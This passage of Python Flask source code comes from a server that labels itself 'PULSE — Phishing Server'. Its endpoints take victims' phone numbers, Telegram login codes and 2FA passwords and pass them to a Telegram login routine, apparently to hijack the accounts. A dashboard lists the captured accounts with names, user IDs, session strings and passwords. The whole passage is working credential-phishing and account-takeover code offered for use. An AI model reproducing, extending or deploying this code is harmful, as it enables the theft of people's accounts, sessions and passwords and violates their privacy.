        s = pending_codes.get(phone, 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    password = d.get('password', None)
    ph = format_phone(ph)
    result = run_telegram_action(ph, code, password)
    return jsonify(result)

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_ok = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        pwd = a.get('password', '')
        pwd_display = f"🔑 {pwd[:15]}..." if pwd else "—"
        twofa = "🔐" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{twofa} {ss_ok} ({ss_len}c)</td>
            <td>{pwd_display}</td>
            <td>{a.get('time','')[:19]}</td>
        </tr>"""
    
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
        body{{background:#0b0a0f;color:#fff;font-family:Arial;padding:20px}}
        h1{{color:#ff2d55}}
        .stats{{display:flex;gap:15px;margin:15px 0}}
        .st{{background:#12121a;padding:15px 25px;border-radius:10px;text-align:center;flex:1;border:1px solid #1e1e2e}}
        .st .n{{font-size:28px;font-weight:bold;color:#0088cc}}
        .st .l{{color:#666;font-size:12px;margin-top:4px}}
        table{{width:100%;border-collapse:collapse;margin-top:15px;font-size:13px}}
        th,td{{padding:10px 8px;text-align:left;border-bottom:1px solid #1e1e2e}}
        th{{background:#12121a;color:#ddd}}
        tr:hover{{background:#12121a}}
    </style></head>
    <body>
    <h1>📊 Dashboard</h1>
    <div class="stats">
        <div class="st"><div class="n">{len(accounts)}</div><div class="l">Total</div></div>
        <div class="st"><div class="n">{total_2fa}</div><div class="l">2FA 🔐</div></div>
    </div>
    <table><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>Session</th><th>Password</th><th>Time</th></tr>
    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
    </table>
    <script>setTimeout(()=>location.reload(),10000)</script>
    </body></html>
    """


# ====== Start Bot Polling ======
def start_bot_polling():
    t = threading.Thread(target=bot_polling_loop, daemon=True)
    t.start()


if __name__ == '__main__':
    if not BOT_TOKEN or not API_HASH or API_ID == 0:
        print("⚠️  Missing environment variables!")
        print(f"   BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
        print(f"   API_ID: {API_ID}")
        print(f"   API_HASH: {'✅' if API_HASH else '❌'}")
        print(f"   OWNER_ID: {YOUR_TELEGRAM_ID}")
        print(f"   BOT_USERNAME: {BOT_USERNAME}")
    else:
        print("✅ All environment variables set!")
    
    start_bot_polling()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"\n{'='*50}")
    print(f"🔥 PULSE — Phishing Server")
    print(f"{'='*50}")
    print(f"🌐 URL:      http://localhost:{port}")
    print(f"📊 Dashboard: http://localhost:{port}/dash")
    print(f"🤖 Bot:      @{BOT_USERNAME}")
    print(f"{'='*50}\n")
    app.run(host='0.0.0.0', port=port, debug=True, threaded=True)
